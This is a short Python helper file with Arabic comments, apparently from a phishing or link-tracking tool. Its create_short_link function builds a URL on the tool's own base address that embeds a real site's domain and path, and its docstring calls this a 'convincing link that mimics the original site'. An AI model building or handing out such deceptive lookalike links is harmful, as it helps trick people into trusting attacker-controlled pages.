# ============================================================
#  utils.py - دوال مساعدة
# ============================================================
from urllib.parse import urlparse
from config import BASE_URL

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def create_short_link(session_id, original_url):
    """إنشاء رابط مقنع يحاكي الموقع الأصلي"""
    parsed = urlparse(original_url)
    domain = parsed.netloc.replace('www.', '')
    path = parsed.path.strip('/') or 'profile'
    if parsed.query:
        path = f"{path}?{parsed.query}"
    short_id = session_id[:8]
    return f"{BASE_URL}/{domain}/{path}/{short_id}"